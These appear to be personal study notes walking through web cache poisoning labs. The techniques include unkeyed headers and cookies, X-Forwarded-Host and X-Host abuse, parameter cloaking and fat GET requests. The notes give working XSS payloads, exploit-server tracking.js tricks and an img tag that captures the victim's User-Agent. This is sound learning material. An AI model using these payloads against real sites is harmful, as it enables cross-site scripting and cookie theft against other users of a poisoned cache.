### Web cache poisoning with an unkeyed header

First we need to go to the home page. As the page has bad cache configurations, because the response has "Cache-Control, Age, and X-Cache" headers, you can add a Cache Buster like ?cb=1234, send it a few times, and you will see that the `X-Cache` header says "hit"

Then, you can see that adding the `X-Forwarded-Host: example.com` reflects that in the response, as can be seen here:
![[Pasted image 20240512153405.png]]
And its loading the "/resources/js/tracking.js" file. So, you can add your exploit server URL to the header, and specify the same file that the web  is trying to get, and in the body, you can put `alert(document.cookie)` and this will retrieve the victim's cookie.

The unkeyed thing means that the age will cache the page even if you add a new header, because it will treat the page the same as before, but adding that new header.

---
### Web cache poisoning with an unkeyed cookie

This is the same as the previous one, but in this case, the webpage is setting a cookie fehost=prod-cache-01. This value is reflected in the response inside a JS obect:
![[Pasted image 20240512160223.png]]

So, now add the Cookie header, with the value `fehost=1234`, and you will see it reflects in the response. Now you can try escaping the doubleQuote and insert malicious JS.
`fehost=test"-alert(1)-"test` will do the trick. Send the request until you see the X-Cache: hit, and refresh the lab page. You should see your XSS.

---
### Web cache poisoning with multiple headers

Access the lab, and you will see the URL "/resources/js/tracking.js". Add the CB, and the X-Forwarded-Host header with some random hostname. This doesn't have any effect on the response. 
Now remove the X-Forwarded-Host, and add a X-Forwarded-Scheme, set on "testing". And you0ll get a 302 response. The location header will point to the URL you are being redirected. If you add the X-Forwarded-Host header, you will see that you are redirect to that host. 

Then, you craft your payload in your exploit server with the body `alert(document.cookie)`, and the filename will be "/resources/js/tracking.js". Add the exploit server URL to your X-Forwarded-Host, and for the X-Forwarded-Scheme add anything you want, but not containing HTTP. 

Send the request, follow the redirection, and you'll see the response with document.cookie. Refresh the home page, and that's it!

---
### Targeted web cache poisoning using an unknown header

Find the GET to the home directory, and use the "param miner" extension to find headers. You'll find the "X-Host" is there

Add a cache buster, and see there is storing the request in cache. 

Add the "X-Host" header with a random value, and you'll see it's reflecting this value in the response. This can be seen in the following screenshot:
![[Pasted image 20240701185255.png]]

In the Exploit Server, specify the file name as "/resources/js/tracking.js" and with the body "alert(document.cookie)". Now modify the home request with the new cache buster = 1 and add the X-Host header with your exploit server. 

Send it until the X-Cache header says "hit". Pay attention to the "Vary" header, with the value "User-Agent". **This is saying that the "User-Agent" is part of the cache key**

Access the home URL with your cb=1, and see the alert triggered. 

As the comment section allows for HTML, put a HTML code that makes the victim interact with your exploit server: `<img src="https://exploit-0af3001e04da045e80207ac301390077.exploit-server.net/foo" />`

Now go and visit your "Access Log" to see your victim sending a GET request, and get the user-agent: `Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36`

Replace the user agent, on the home request, with the X-Host header added. Bare in mind the user-agent is used as a cache key

---
### Web cache poisoning via an unkeyed query string

Find the home request and send it a few times to validate this request is a potential cache oracle by adding a random cache buster.

You can have the cache hit even by adding a new header, like "Origin". 

When you get a cache-miss notice that you have the payload reflected on the response:
![[Pasted image 20240701192118.png]]
Try to break out of that with the following: `'/><script>alert(1)</script>`
If you send this until the X-Cache says hit, if you delete the querystring, and point to the home directory, it will reflect your script tag on the response until the cache buster expires (30 seconds). 

Remove the Origin header and validate that the querystring payload can be sent and it will be loaded eventually. Keep sending the payload to the home endpoint until you get the popup. 

---
### Web cache poisoning via an unkeyed query parameter

Use a cache buster on the home request to check if it's potentially a cache oracle. 
Then use the "param miner" to guess GET parameters. You'll find the "utm_content" is supported by the application. 

Send a GET request to `/utm_content='/><script>alert(1)</script>` until you get a "cache miss". 

---
### Parameter Cloaking

Use param miner to detect the "utm_content" parameter is also excluded from the cache key. If you append another parameter, the cache treats this as a single parameter. So...

Right click on the request, select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically

Observe the page imports the script "/js/geolocate.js", excuting the callback function "setCountryCookie()". You can add the callback parameter with the new function to be exceuted.

`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`

---
### Web cache poisoning via a fat GET request

Add this `callback=alert(1)` as the body of the GET request to `GET /js/geolocate.js?callback=setCountryCookie`

---
### URL normalization

Send a request to a non existing endpoint such as /falopa. See the "falopa" reflected on the response. Create a valid payload escaping the `<p>` get a hit on the cache, and send the URL to the victim. 